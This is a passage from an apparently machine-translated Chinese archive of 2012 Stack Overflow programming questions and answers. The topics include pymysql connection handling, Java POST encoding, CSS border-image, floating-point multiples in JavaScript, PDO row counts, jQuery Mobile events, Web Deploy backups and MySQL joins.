            con = lite.connect(host='127.0.0.1',unix_socket='/run/mysqld/mysqld.sock', user='ivica',passwd='pass',db='baza',charset='utf8')
    except lite.err.OperationalError as err:
        msgBox = QtGui.QMessageBox()
        msgBox.setText(str(err))
        msgBox.show()
    return con

class Logon(QtGui.QDialog):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.ui=Ui_dlgLogovanje()
        self.ui.setupUi(self)
        QtCore.QObject.connect(self.ui.dugmeUloguj, QtCore.SIGNAL("clicked()"), self.doLogin)

    def doLogin(self):      
        if con == None:
            reply = QtGui.QMessageBox.warning(self, 'Greška',
            "Can't establish connection to database!", QtGui.QMessageBox.Ok)
            if reply == QtGui.QMessageBox.Ok:
                self.close() #and when user clicks OK program closes

        else:
        with dbconnect():
            cur = dbconnect().cursor()
                    #do other database stuff, check credentials etc. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:18:19.527

使用`try...except`块来处理`OperationalError`异常：

```
import sys
from PyQt4 import QtGui
import pymysql as lite

def dbconnect():
    global con
    config = {
        'host' : '127.0.0.1',
        'user' = 'ivica',
        'passwd' = 'pass',
        'db' = 'baza',
        'charset' = 'utf8'
        }
    try:
        if os.name == 'nt':
            con = lite.connect(**config)
        else:
            con = lite.connect(unix_socket = '/run/mysqld/mysqld.sock', **config))
    except lite.err.OperationalError as err:
        msgBox = QtGui.QMessageBox()
        msgBox.setText(str(err))
        msgBox.exec_()

if __name__ == '__main__':
    app = QtGui.QApplication(sys.argv)
    con = None
    dbconnect()
    if con is not None:
        sys.exit(app.exec_()) 
```

* * *

听起来MySQL连接是你程序的核心部分，所以你不妨一开始就建立连接，或者如果连接过程不成功则退出。

此外，使用

```
with dbconnect():
    ... 
```

与定义 global 不兼容`con`，因为当 Python 退出`with`-block 时连接关闭。

# android - 不支持 google api 的手机的 Android 应用程序崩溃

> ID：12429354
> 
> 赞同：1
> 
> 时间：2012-09-14T17:36:12.590
> 
> 标签：android

我的应用程序支持 google apis。在支持此功能的手机和模拟器中运行良好。但如果我尝试在不支持 google api 的模拟器上运行它......应用程序崩溃。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:40:30.180

如果您的应用使用：

1.  谷歌地图
2.  GCM
3.  应用内结算
4.  层积层
5.  符合 Google API 条件的任何其他 Google 服务

在设备上，经验法则是，如果设备附带 Google Play，它将具有 Google API。

# java - 如何在 Java 中发送 POST 请求？

> ID：12429356
> 
> 赞同：1
> 
> 时间：2012-09-14T17:36:15.537
> 
> 标签：java, jsp, httprequest

当我从 JSP 发送请求时，我使用此代码

```
<%@ page language="java" contentType="text/html; charset=UTF-8"
pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<body>

<form method="post"  action="http://translate.intelsoft.az" id="tform" name="ftext">
<input class="gogo1"  value="a" name="l" id="l1" /> <div class="il">
<p>Rusca</p>
<textarea class="ilkin1" name="t" id="t1" >
выыававыавыавыавфыа
выыававыавыавыавфыа
выыававыавыавыавфыа
выыававыавыавыавфыа</textarea>
<div><input class="gogo" type="submit" value="Tərcümə1" name="b1" /></div></div>    </form>

</body>
</html> 
```

并且响应是正确的，所以我看到了我的参数值。但是当我从 Java 发送时，我没有得到正确的响应。我认为参数没有正确发送。这是我的Java代码：

```
String urlParameters = "t=выыававыавыавыавфыа&l=a";
String request = "http://translate.intelsoft.az";
URL url = null;
try {
    url = new URL(request);
} catch (MalformedURLException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
HttpURLConnection connection = null;
try {
    connection = (HttpURLConnection) url.openConnection();
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
}           
connection.setDoOutput(true);
connection.setDoInput(true);
connection.setInstanceFollowRedirects(false); 
try {
    connection.setRequestMethod("POST");
} catch (ProtocolException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
connection.setRequestProperty("Content-Type", "text/html"); 
connection.setRequestProperty("charset", "utf-8");
connection.setRequestProperty("Content-Length", "" + Integer.toString(urlParameters.getBytes().length));
connection.setUseCaches (false);

DataOutputStream wr;
try {
    wr = new DataOutputStream(connection.getOutputStream ());
    wr.writeBytes(urlParameters);
    wr.flush();

    BufferedReader rd = new BufferedReader(new InputStreamReader(connection.getInputStream()));
    String line;
    while ((line = rd.readLine()) != null) {
        System.out.println(line);
    }
    wr.close();

    connection.disconnect();
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
```

这里有什么问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-14T17:42:33.907

首先，您的 JSP 页面使用 UTF-8 字符编码。

```
<%@ page ... pageEncoding="UTF-8"%> 
```

但是，您的 Java 代码没有使用相同的字符编码。

```
DataOutputStream wr;
try {
    wr = new DataOutputStream(connection.getOutputStream ());
    wr.writeBytes(urlParameters); // <--- Wrong! Uses platform default encoding.
    wr.flush(); 
```

你需要把那个麻烦的部分换成

```
try {
    connection.getOutputStream().write(urlParameters.getBytes("UTF-8")); 
```

请注意，整个`DataOutputStream`装饰是不必要的。它用于完全不同的目的（即写入`.dat`类型文件）。不要忘记以设置`Content-Length`标题的方式指定相同的字符集。

* * *

其次，参数名称/值本身应该是 URL 编码的，以便从 HTTP 请求中正确提取。

```
String urlParameters = "t=" + URLEncoder.encode("выыававыавыавыавфыа", "UTF-8")
                     + "&l=" + URLEncoder.encode("a", "UTF-8"); 
```

* * *

第三，您的请求标头实际上也是错误的：

```
connection.setRequestProperty("Content-Type", "text/html"); 
connection.setRequestProperty("charset", "utf-8"); 
```

您根本没有发送`text/html`数据。您正在发送`application/x-www-form-urlencoded`数据。此外，这`charset`应该是`Content-Type`标题的一个属性，因此：

```
connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8"); 
```

### 也可以看看：

*   [使用 java.net.URLConnection 触发和处理 HTTP 请求](https://stackoverflow.com/questions/2793150/how-to-use-java-net-urlconnection-to-fire-and-handle-http-requests)

# firefox - Firefox 15 边框图像失败

> ID：12429358
> 
> 赞同：0
> 
> 时间：2012-09-14T17:36:24.867
> 
> 标签：firefox, css

CSS3`border-image`属性已停止使用在 Firefox 14 中工作的语法在 Firefox 15 中工作， [http://jsfiddle.net/uzZVf/2/](http://jsfiddle.net/uzZVf/2/)

当然前缀已被删除，但即使没有它，它也会失败。

是否有以前不存在的新语法要求？我怎样才能`border-image`正常运作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:48:19.353

您需要在`border-image-width: 4px 4px 4px 4px;`CSS 中添加：，否则即使使用其他边框 CSS，Firefox 也会将其设置为 1px 宽。

演示：http: [//jsfiddle.net/SO_AMK/uzZVf/4/](http://jsfiddle.net/SO_AMK/uzZVf/4/)

Mozilla 开发团队将边框图像规范从[2008 工作草案](http://www.w3.org/TR/2008/WD-css3-background-20080910/#the-border-image)更新为[2011 候选推荐](http://www.w3.org/TR/2011/CR-css3-background-20110215/#border-images)，请参阅[本文](http://dbaron.org/log/20120612-border-image)了解详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T19:46:40.677

是的，您的样式现在需要是这样的（XYZ = 边框宽度）：

```
 border-width: XYZpx;

        border-image-width: XYZpx XYZpx XYZpx XYZpx;
        border-image-slice: fill;
        border-style: solid; 
```

# javascript - 在不移动节点的情况下重绘 d3 力布局

> ID：12429359
> 
> 赞同：1
> 
> 时间：2012-09-14T17:36:24.927
> 
> 标签：javascript, graph, d3.js, force-layout

我目前正在使用 d3 进行有趣的交互式导航，其中每个节点都是我网站上的一个位置。希望在调整窗口大小或用户拖动节点时，用户可以很高兴看到导航的交互。

问题是在单击节点时，我想更改节点以指示哪个节点当前处于“活动状态”。但是，每当我在力布局上调用绘图以激发修改时，力布局“摆动”并重新计算所有节点的位置。有没有一种简单的方法来改变节点而不改变它们的位置或重新计算它们的位置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T18:11:11.230

我用以下代码段解决了一个类似的问题：

```
if (force.alpha() == 0) {
    force.start();
    force.stop();
} 
```

该`if`语句防止在完成之前停止图形布局。在将新样式和属性应用到节点后调用它。

# javascript - 确定一个浮点数是否是另一个浮点数的倍数？

> ID：12429362
> 
> 赞同：3
> 
> 时间：2012-09-14T17:36:54.440
> 
> 标签：javascript, floating-point

我需要使用 JavaScript 确定浮点数是否是另一个浮点数的倍数。

我已经阅读了一些关于浮点数的其他问题，并且了解到它们不能与模运算符 (%) 一起正常工作。我还读到您可以通过乘以 10/100/1000 等将浮点数转换为整数，但这并非在所有情况下都能正常工作。

例子：

```
var A = 25.13;
var B = .0001;

var Value = A*1e5;
var Step  = B*1e5;

// Is Value a multiple of Step?
if(0 === (Value % Step)) {
// Do something
} 
```

在这种情况下，Value 是 Step 的倍数，它可以正常工作。但是关于：

```
var A = 2.2;
var B = .0001; 
```

它应该是一个有效的倍数，但我们得到的是：

```
220000.00000000003 % 10 = 2.9103830456733704e-11 
```

小数点后 11 位有错误的 3。我想我可以通过以下方式纠正四舍五入的问题`toFixed()`：

```
var Value = (A*1e5).toFixed(10);
var Step  = (B*1e5).toFixed(10); 
```

但如果你这样做：

```
var A = 45436212356482;
var B = .0001; 
```

你得到：

```
4543621235648200192.0000000000 % 10.0000000000=2 
```

这是一个有效的倍数，但它认为它不是。

和：

```
var A = 45436212546522156.45621565421;
var B = .0001; 
```

这不是一个有效的倍数，但它认为它是：

```
4.543621254652216e+21 % 10.0000000000=0 
```

是否有一个聪明的技巧来确定一个浮点数是否是另一个浮点数的倍数？或者这是不可能的？

**更新：**

目标是将用户输入的数字（整数或小数）限制为一定的增量。

*   如果 Increment 为 1，则用户可以输入 1、2、3、4 等。
*   如果增量为 0.5，用户可以输入 0.5、1、1.5、2、2.5 等。
*   如果增量为 .0002，用户可以输入 1,1.001,1.0004,1.0006，但不能输入 1.0001

从逻辑角度来看，给定值是或不是给定增量的有效倍数。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:05:26.097

鉴于您的最后两个示例，使用 4543621235648200192 等，您似乎想要接受 0.0001 的整数倍数并拒绝那些不是的数字，**并且**您不想使用 .0001 而是使用包含浮动的变量来执行此操作 -点值最接近 0.0001。

一般来说，这是不可能的。当您传递其他东西时，算法无法“知道” .0001 是有意的。

如果您对问题进行更多限制，则可能有解决方案。例如，有可能（也许不容易）回答这个问题：浮点值 X 是最接近 0.0001 的整数倍的浮点值吗？（换句话说，是否有一个整数 k 使得 .0001 乘以 k 并四舍五入到最接近的浮点值正好产生 X？）

因此，要获得解决方案，您需要进一步描述您的目标。您是否想要 Step 的任意值或仅某些值的解决方案？由于二进制浮点不能足够精确地表示 Step，您有其他方式来描述它吗？例如，它是否总是 0.0001 的倍数？您想要作为倍数接受的值是否始终是最接近精确数学倍数的二进制浮点数，还是可能有其他错误？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T19:45:38.030

基本问题是 32 位浮点数不能正确表示所有实数。例如，如果用户输入 0.1，则浮点数的值为 0.099999994。

因此，如果您有 0.1 的增量，您无法判断他是否输入了 0.1（这将是有效的），或者他是否输入了 0.09999..（这将是无效的）。

我的建议是改用整数数据类型并将其视为定点数。这样您就不会失去精度，并且可以轻松检查多重性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-23T15:20:48.560

如果我错了，请纠正我，但解决方案如下：

> ```
> function IsMultipleOf(a, b) {
>    var result = a % b;
>    return (result < 1e-3);
> } 
> ```

只回答了一半的问题。假设以下（使用python代码）：

```
dt = 2.4
>>> dt = 2.2999999999999998
t = 13 * dt
>>> t = 29.899999999999999
t % dt
>>> 8.8817841970012523e-16 
```

在这种情况下，它会正常工作。现在假设：

```
dt = 1.4
>>> dt = 1.3999999999999999
t = 3 * dt
>>> t = 4.1999999999999993
t % dt
>>> 1.3999999999999995 
```

由于舍入误差的作用使得*t*低于*dt*的下一个倍数，因此模的值更接近*dt*而不是 0。

解决此问题的一种可能方法是检查两种情况：

```
modt = t % dt
(abs(modt) <= tolerance) or (abs(dt - modt) <= tolerance) 
```

[根据这个答案](https://stackoverflow.com/questions/3281237/is-the-use-of-machine-epsilon-appropriate-for-floating-point-equality-tests/21309626#21309626)`tolerance = machine epsilon * abs(dt) / 2`， 我期望在哪里，但是模运算以某种方式引入了比这更多的错误。看起来像：

```
tolerance = machine epsilon * max(abs(t), abs(dt)) / 2 
```

处理这项工作，但这只是一个猜测。或者，

```
tolerance = 2 * machine epsilon * abs(dt) 
```

似乎也可以正常工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-29T10:55:22.647

以下适用于所有小数。

```
var result = Math.round( Math.round(number1 * 100000) % Math.round(number2 * 100000) ) / 100000; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-10-17T16:40:27.050

这是您可以做到的一种方法：

```
function floatingPointAMultipleOfB(a, b) {
  const precision_a = getNumbersAfterDecimal(a)
  const precision_b = getNumbersAfterDecimal(b)

  if (precision_a > precision_b) return false;

  const int_a = Math.round(multBy10(a, precision_b))
  const int_b = Math.round(multBy10(b, precision_b))
  return int_a % int_b === 0
}

function getNumbersAfterDecimal(n) {
  const exponential = n.toString().split('e');
  if (exponential.length === 2) n = n.toFixed(Math.abs(exponential[1]))
  return (n.toString().split('.')[1] || []).length;
}

function multBy10(val, n) {
  if (n === 0) return val
  return multBy10(val, n-1) * 10
} 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-09-14T17:41:07.350

由于您正在处理浮点数，因此最好的办法是确定“接近”的接近程度，并使用它：

```
function IsMultipleOf(a, b) {
   var result = a % b;
   return (result < 1e-3);
} 
```

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2012-09-14T17:48:16.677

> 我需要使用 JavaScript 确定浮点数是否是另一个浮点数的倍数。

如果我们假设浮点数用于逼近实数，那么根据定义，每个浮点数都是另一个数的倍数。当然，由于浮点数实际上是有理数的子集，所以当然有很多对浮点数没有共同的浮点除数。例如，尾数中具有不同素数系数的任何两个浮点数都没有公约数。指数的范围进一步限制了精确倍数的对。

但也许您不是在寻找具有任意乘法因子的数字，而是寻找具有整数除数的数字并测试结果是否低于所选阈值（通常称为 epsilon）。

例如**函数式伪代码！**

```
fmod :: float -> float -> float
fmod a b =
    b - a * floor( b / a )

EPSILON = 1e-5;
divides_to_integer :: float -> float -> boolean
divides_to_integer a b =
    fmod(a, b) < EPSILON 
```

fmod 函数应该取自 JavaScript 数学库。

# php - 如何使用 PHP 的 PDO 检查 db 查询返回的结果

> ID：12429366
> 
> 赞同：6
> 
> 时间：2012-09-14T17:37:15.823
> 
> 标签：php, pdo

如何在 PHP 中使用 PDO 检查我的结果集是否为空？

```
$SQL = "SELECT ......... ORDER BY lightboxName ASC;";
$STH = $DBH->prepare($SQL);
$STH->bindParam(':member_id', $member_id);
$STH->execute();
$STH->setFetchMode(PDO::FETCH_ASSOC);

while($row = $STH->fetch()) {
    $lightbox_name = $row['lightboxName'];
    $lightbox_id = $row['lightboxID'];
    echo '<option value="'.$lightbox_id.'">'.$lightbox_name.'</option>';
} 
```

我曾经这样做过：

```
$result = mysql_query("SELECT ...... ORDER BY lightboxName ASC;");
if(!$result) { echo 'No results found!'; } 
```

但是刚刚开始使用 PDO 并且准备好的语句和检查`$STH`似乎没有按预期工作——它总是有价值的！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-14T17:48:09.400

我会尝试使用[`rowCount()`](http://php.net/manual/en/pdostatement.rowcount.php)：

```
$rows_found = $STH->rowCount(); 
```

但是，根据手册：

> 如果关联 PDOStatement 执行的最后一条 SQL 语句是 SELECT 语句，则某些数据库可能会返回该语句返回的行数。但是，不能保证所有数据库都具有此行为，并且不应依赖于可移植应用程序。

如果它不适合您，您可以使用手册中提到的其他方法。

您当然也可以在循环之前设置一个变量，在`while`循环中更改它并检查循环之后的值...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:39:44.657

只需转储有关变量的信息。

```
var_dump($STH) 
```

**编辑**

我刚收到问题。有这个[`rowCount()`](http://php.net/manual/en/pdostatement.rowcount.php)功能。只需 `$STH->rowCount();`用于行数，然后进行比较。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-11T11:00:00.767

好的，这是它确实起作用的代码，最后经过几个小时的环顾并混合匹配一些答案，这是一个实际上会返回您的 select 语句的计数的代码。SQL 是选择语句，显然 $username1 是用户名文本框的帖子。$password1 与用户名设置相同。除此之外，您应该拥有使其工作所需的一切，只需用您的变量代替我的变量即可。我希望这可以节省一些人的时间，因为我搜索了一段时间，试图在这里得到我想要的东西。此解决方案适用于当您有一个 select 语句并且您希望能够根据它返回的内容继续或停止时。

```
SQL = 'SELECT * from Users WHERE Username = :Username AND Password = :Password';
STH = $conn->prepare($SQL);
STH->bindParam(':Username', $username1);
STH->bindParam(':Password', $password1);
STH->execute();
STH->setFetchMode(PDO::FETCH_ASSOC);

row_count = $STH->rowCount(); 
```

# jquery-mobile - asp.net mvc4, jquery mobile：jquery/javascript 函数用于捕获在浏览器上将一个视图更改为另一个视图

> ID：12429367
> 
> 赞同：1
> 
> 时间：2012-09-14T17:37:20.770
> 
> 标签：jquery-mobile, asp.net-mvc-4

我有 3 个不同的视图共享同一个母版页 (_layout.vbhtml)。

在每个视图中，用户必须选择不同的列表项。我正在使用 sessionStorage 来存储选定的值。然后，在每次视图更改时，我想将这些值发布回服务器。为此，我在每个视图的末尾添加以下内容：

```
 $(window).unload(function () {
        alert("Bye now!");
        postjson();
      }); 
```

但是，它没有按预期工作。用户可以单击不同的按钮以离开页面，但是在单击按钮时，窗口不应该卸载并触发警报消息吗？不，它没有那样做。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T22:36:32.750

> 可能来不及回答

当用户从一个视图移到另一个视图时，视图共享相同的布局，他/她不会`navigate away` **离开**该视图。您应该使用 jquery 移动[事件](http://jquerymobile.com/test/docs/api/events.html)

使用`pagebeforehide`或`pagehide`将为您做。这里是文档的摘录

**页面前隐藏**

> 在实际过渡动画开始之前，在我们正在过渡的“fromPage”上触发。此事件的回调将接收一个数据对象作为其第二个参数。此数据对象具有以下属性：
> 
> ```
>  nextPage (object)
>         A jQuery collection object that contains the page DOM element that we are transitioning to.
> 
> Note that this event will not be dispatched during the transition of the first page >     at application startup since there is no previously active page. 
> ```

**页隐藏**

> 过渡动画完成后在“fromPage”上触发。此事件的回调将接收一个数据对象作为其第二个参数。此数据对象具有以下属性：
> 
> ```
>  nextPage (object)
>         A jQuery collection object that contains the page DOM element that we just transitioned to.
> 
> Note that this event will not be dispatched during the transition of the first page at application startup since there is no previously 
> ```
> 
> 活动页面。
> 
> 您可以通过绑定回调函数的第二个参数访问 prevPage 或 nextPage 属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:47:37.347

尝试使用

```
window.onbeforeunload = function() {
alert("Bye now!");
        postjson();
      }); 
```

# javascript - JQuery DataTable 和 JsonDate，非常基础

> ID：12429370
> 
> 赞同：0
> 
> 时间：2012-09-14T17:37:49.830
> 
> 标签：javascript, jquery, json, model-view-controller

我发现[这个问题](https://stackoverflow.com/questions/12419405/converting-datetime-from-json-to-readable-format)与我的情况非常相似，但我不知道在 JQuery DataTable`DateTime`字段中集成的基本步骤。如何将转换后的 json datetime 对象插入到行中的数据表中

```
 $('#myDataTable').dataTable({
            "bServerSide": true,
            "sAjaxSource": "/Home/AjaxHandler",

            "aoColumns": [
                        { "sName": "JoinDate" }
                    ]
        });
    }); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T17:51:16.617

也许[fnRender](http://datatables.net/usage/columns)功能会帮助你

```
"aoColumns": [
{
    "sName": "JoinDate",
    "fnRender" : function(obj, val)
    {
        var dx = new Date(parseInt(val.substr(6)));
        var dd = dx.getDate();
        var mm = dx.getMonth() + 1;
        var yy = dx.getFullYear();

        if (dd <= 9)
        {
            dd = "0" + dd;
        }
        if (mm <= 9) {
            mm = "0" + mm;
        }
        return dd + "." + mm + "." + yy;
    }
}
] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-23T14:16:25.050

我正在使用[这个](http://www.datatables.net/examples/advanced_init/column_render.html)解决方案。您只需要实现解析功能：

```
"columnDefs": [{
                    "render": ParseDateColumn,
                    "targets": 1
                }]

...

function ParseDateColumn(data, type, row) {
    return formatDate(new Date(data), "yyyy-MM-dd HH:mm:ss");
} 
```

# webdeploy - 在 Web Deploy 工具中设置自动备份

> ID：12429371
> 
> 赞同：12
> 
> 时间：2012-09-14T17:37:49.707
> 
> 标签：webdeploy, microsoft-web-deploy

我一直在努力设置自动备份，但似乎碰壁了。按照本[文档](http://www.iis.net/learn/publish/using-web-deploy/web-deploy-automatic-backups)，并使用 Powershell，我启用了备份（*TurnOn-Backups -On $true*，然后*是 Configure-Backups -SiteName "test1" -Enabled $true*；所以*Get-BackupSettings -SiteName "test1"*告诉我备份已启用）。

但是，每当我从 Visual Studio 进行发布时，都不会创建备份。我已经设置了备份路径，权限设置为允许所有人使用..所以我不知道我还能检查什么。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-19T17:38:40.510

简短回答：目前在 VS 2010“Web One Click Publish”功能中被破坏。:'(

我花了将近一整周的时间与 MS 开发团队密切合作，并尝试了所有可以想象到的方法，但还没有找到不涉及 msdeploy.exe 命令实用程序的解决方案（即直接使用 VS 从 VS 执行此操作没有运气“网络一键发布”功能）。:(

希望他们在 VS 2010 SP1 中制作一个补丁来解决这个问题。支持 Web 部署（[请参阅“功能”部分](http://www.iis.net/downloads/microsoft/web-deploy)），但不支持自动备份功能。我知道这不是您要寻找的答案，我也不是，但是这件事的可悲事实。

我认为此时你所能期望的最好的就是 Sayed[在这里](http://social.msdn.microsoft.com/Forums/eu/msbuild/thread/03f5d7aa-2a52-4149-80dd-66dda87f4b5a)回答的那样，虽然老了，但目前仍然是唯一的解决方案（注意：旧 VS 2008 网站模板的 msbuild 选项卡现在是“构建事件”下VS 2010 Web App 项目中的编译选项卡）。这种方法唯一的缺点是它会在每次编译时创建备份，而不仅仅是在部署时。否则，您必须编写一个在每次发布之前运行的特殊脚本。

附带说明一下，您还可以使用“配置编辑器”在服务器级别通过 IIS 管理器编辑您的 Web 部署配置（必须安装管理角色）。

![在此处输入图像描述](../Images/ad7f050d00728fd59337ddb16e000f31.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-10T13:22:46.783

通过从这个问题中窃取一些想法，我设法让 VS2010 部署自动备份： [msdeploy (Web Deploy) failed with 401 auth issues](https://stackoverflow.com/questions/4428562/msdeploy-web-deploy-failing-with-401-auth-issues/4898553#4898553)

首先在您的本地计算机上[安装 Web Deploy v3.5](http://www.iis.net/downloads/microsoft/web-deploy) - 安装了 VS2010 的计算机。

现在编辑你的 VS2010 环境配置：

```
C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\devenv.exe.config
# or
C:\Program Files\Microsoft Visual Studio 10.0\Common7\IDE\devenv.exe.config 
```

找到`<assemblyBinding>`节点，并在其中添加以下内容：

```
<dependentAssembly>
    <assemblyIdentity 
        name="Microsoft.Web.Deployment" 
        publicKeyToken="31bf3856ad364e35" culture="neutral"/>
    <bindingRedirect oldVersion="7.1.0.0" newVersion="9.0.0.0"/>
</dependentAssembly> 
```

保存，重启VS2010。

您现在应该发现您可以在 VS2010 中使用一键发布来推送到运行 Web Deploy v3 的服务器，如果您在服务器上正确配置了备份（请参阅@Chiramisu 的回答），那么应该可以成功创建备份！哇！

# mysql - MySQL - 喜欢 + 加入

> ID：12429374
> 
> 赞同：2
> 
> 时间：2012-09-14T17:38:20.863
> 
> 标签：mysql, join, concat, group-concat

我想在我的数据库中搜索一个用户，并为每个用户在另一个表上进行 JOIN。这是我的表：

`USERS`: `id`, `firstname`, `lastname`, [...] - 包含用户数据

`FRIENDS`: `fan_id`, `idol_id`, [...] - 哪个用户关注哪个用户

这是我的搜索查询，经典：

```
SELECT `id`, `username`, `firstname`, `lastname`, `lang`, `twitter`, `facebook`, `picture`, `regdate`
FROM `users`
WHERE `username` LIKE ?
OR `email` LIKE ?
OR `firstname` LIKE ?
OR `lastname` LIKE ?
OR `twitter` LIKE ?
OR `facebook` LIKE ?
ORDER BY `username`; 
```

所以现在，我想要一个获取朋友表，其中包含搜索到的用户和正在询问的用户之间的关系。

这是我的想法：

```
SELECT `id`, `username`, `firstname`, `lastname`, `lang`, `twitter`, `facebook`, `picture`, `regdate`,
GROUP_CONCAT(
    CONCAT_WS(':', `fan_id`, `idol_id`) SEPARATOR ';'
) AS relations
FROM `friends`, `users`
WHERE (`username` LIKE ?
OR `email` LIKE ?
OR `firstname` LIKE ?
OR `lastname` LIKE ?
OR `twitter` LIKE ?
OR `facebook` LIKE ?)
AND (
(`fan_id` = 100 AND `idol_id` = `id`)
OR
(`fan_id` = `id` AND `idol_id` = 100)
)
ORDER BY `username`; 
```

`relations`实际上，如果搜索到的用户显示为`fan_id`AND 搜索用户为`idol_id`或相反，我想进入。但是当我使用第一个查询搜索用户时，我有 2 行，2 个用户（ids = `80`& `125`）。对于第二个查询，我只有 1 行 (id = `80`)，但`relations`显示`100:80;100:125`我有一半的查询工作......

有关信息，如果没有 (in `relations`)，我也想得到一个结果，所以我尝试`IFNULL(..., 0)`了但仅此而已。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:41:03.870

这是基于对我认为您的目标的猜测：

```
select users.id,users.firstname,
case 
when CONCAT_WS(';',t1.fans,t2.idols)='' then null
else CONCAT_WS(';',t1.fans,t2.idols)
end as relations
from users left join 
(
select CONCAT_WS(':',fan_id,idol_id) as fans,idol_id
from friends
where fan_id=80
) as t1
on users.id=t1.idol_id
left join
(
select CONCAT_WS(':',fan_id,idol_id) as idols,fan_id
from friends
where idol_id=80
) as t2
on users.id=t2.fan_id
where id=100 
```

[Sqlfiddle](http://sqlfiddle.com/#!2/9a1cb/1)是 id 为 100 的用户正在搜索 id 为 80 的用户的结果。

`where fan_id=80`并且`where idol_id=80`需要为正在搜索的用户设置正确的 id，并且`where id=100`可以替换为查找执行搜索的用户的 wheres。或者您可以删除所有三个并获取每个人与彼此的关系的列表。

- -编辑 - -

[Sqlfiddle](http://sqlfiddle.com/#!2/25186/6)

此查询提供的详细信息较少，但仅搜索一次朋友和用户一次；具体来说，它不再保存偶像和粉丝列中的 id，而是这些列要么为 1，要么为空。1 表示该用户是另一个用户的用户，因此用户 125 搜索用户 100 并且 has`fan - null | idol - 1`这意味着他们不是用户 100 的粉丝，而是用户 100 的偶像。我之前的评论中建议的关系列要么是粉丝和偶像都是 2，要么是其中之一，要么是 1，或者两者都不为 0。

```
select users.id,users.firstname,sum(t1.fan) as fan,sum(t1.idol) as idol,
case 
when t1.fan is null and t1.idol is null then null
else count(*) 
end as relations
from users
left join
(
select fan_id,idol_id,
case when fan_id=100 then 1 end as idol,
case when idol_id=100 then 1 end as fan
from friends
where fan_id=100 or idol_id=100
) as t1
on users.id=t1.fan_id or users.id=t1.idol_id
where firstname like '%user1%'
group by id 
```

您必须更改正在搜索的用户的 id 的四个地方，全部是 100 个。底部的 where 子句可以由您想要的任何内容填充。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:25:59.220

`JOIN`使用标准语法比使用您正在使用的过时的 omega-join 模型要容易得多。

在多表查询中，您可能应该限定列名。

从所谓的潜在客户表开始您的加入。在您的情况下，您希望每个用户一行，因此开始加入。

您在 WHERE 中的一长串`OR`标准将导致您的查询执行得很差。您可能需要考虑某种 FULLTEXT（二进制模式）搜索。

反引号会抑制可读性并且不是必需的，除非表或列与保留字具有相同的名称。

您在查询中有一个`GROUP_CONCAT`汇总函数，但没有相应`GROUP BY`的子句。你需要两者。（有一些允许的语言快捷方式`GROUP BY`不是必需的，但在调试时应该避免使用这些快捷方式。）

我想弄清楚你的加入标准，但我不明白。我不明白 id = 100 有什么特别之处。但是，您是否可能希望在加入的第二部分中寻找`idol_id = 100`而不是`fan_id = 100`？

```
 (f.fan_id = u.id AND  f.idol_id = 100) 
```

对于这个项目的局外人来说，你所拥有的似乎不合逻辑。

我建议你试试这个：

```
SELECT u.id, u.username, 
       u.firstname, u.lastname, 
       u.lang, u.twitter, u.facebook, 
       u.picture, u.regdate,
       GROUP_CONCAT(CONCAT_WS(':', f.fan_id, f.idol_id) SEPARATOR ';') AS relations
  FROM users u
  JOIN friends f ON  (                  
             (f.fan_id = 100 AND f.idol_id = u.id)
                OR
             (f.fan_id = u.id AND  f.idol_id = 100)
            )
 WHERE u.username LIKE ?
    OR u.email LIKE ?
    OR u.firstname LIKE ?
    OR u.lastname LIKE ?
    OR u.twitter LIKE ?
    OR u.facebook LIKE ?
 GROUP BY u.id, u.username, 
       u.firstname, u.lastname, 
       u.lang, u.twitter, u.facebook, 
       u.picture, u.regdate
 ORDER BY u.username 
```

# spring - Spring-Hibernate 应用程序与 EJB-Hibernate 应用程序集成？

> ID：12429376
> 
> 赞同：0
> 
> 时间：2012-09-14T17:38:26.557
> 
> 标签：spring, hibernate, ejb

我有一个**EJB-Hibernate**应用程序，目前我正在尝试集成另一个内置于**Spring-Hibernate**的应用程序。

现在的问题是，由于他们都使用 Hibernate，我很困惑如何集成他们的休眠配置？

同样，它们都使用不同的方式编写 Hibernate 配置，即基于 Spring 的应用程序通过 Spring beans 和 hibernate-cfg.properties 文件使用，

